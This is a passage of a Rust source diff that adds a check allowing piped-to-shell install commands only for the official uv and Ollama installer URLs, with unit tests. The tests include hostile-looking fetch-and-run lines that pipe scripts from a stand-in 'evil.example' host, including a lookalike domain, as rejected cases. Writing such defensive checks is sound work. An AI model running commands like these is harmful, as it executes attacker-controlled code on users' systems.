@@ -490,6 +490,23 @@ pub fn pipe_line_trusted(line: &str) -> bool {
     !urls.is_empty() && urls.iter().all(|u| trusted_installer_url(u))
 }
 
+fn doc_installer_url(url: &str) -> bool {
+    let Some((host, path)) = parse_https_host_path(url) else {
+        return false;
+    };
+    if path.contains("..") || path.contains('?') {
+        return false;
+    }
+    (host == "astral.sh" && path == "/uv/install.sh")
+        || (host == "ollama.com" && path == "/install.sh")
+}
+
+/// True when every https URL on the line is an official uv or Ollama doc installer (and there is at least one).
+pub fn pipe_line_doc_installer(line: &str) -> bool {
+    let urls = extract_http_urls(line);
+    !urls.is_empty() && urls.iter().all(|u| doc_installer_url(u))
+}
+
 const MAX_HIDDEN_PAYLOADS: usize = 16;
 const MAX_DECODED_BYTES: usize = 64 * 1024;
 
@@ -1136,6 +1153,37 @@ mod tests {
         ));
         assert!(!pipe_line_trusted("curl | sh"));
         assert!(!pipe_line_trusted("curl http://sh.rustup.rs | sh"));
+    }
+
+    #[test]
+    fn pipe_line_doc_installer_uv_and_ollama() {
+        assert!(pipe_line_doc_installer(
+            "curl -LsSf https://astral.sh/uv/install.sh | sh"
+        ));
+        assert!(pipe_line_doc_installer(
+            "curl -fsSL https://astral.sh/uv/install.sh | bash"
+        ));
+        assert!(pipe_line_doc_installer(
+            "wget -qO- https://ollama.com/install.sh | sh"
+        ));
+        assert!(pipe_line_doc_installer(
+            "curl https://ollama.com/install.sh | bash"
+        ));
+        assert!(!pipe_line_doc_installer("curl https://evil.example/x | sh"));
+        assert!(!pipe_line_doc_installer(
+            "curl https://astral.sh.evil.example/uv/install.sh | sh"
+        ));
+        assert!(!pipe_line_doc_installer(
+            "curl https://astral.sh/uv/install.sh?x=1 | sh"
+        ));
+        assert!(!pipe_line_doc_installer(
+            "curl https://astral.sh/ruff/install.sh | sh"
+        ));
+        assert!(!pipe_line_doc_installer(
+            "curl https://astral.sh/uv/install.sh https://evil.example/x | sh"
+        ));
+        assert!(!pipe_line_doc_installer("curl http://astral.sh/uv/install.sh | sh"));
+        assert!(!pipe_line_doc_installer("curl | sh"));
     }
 
     #[test]
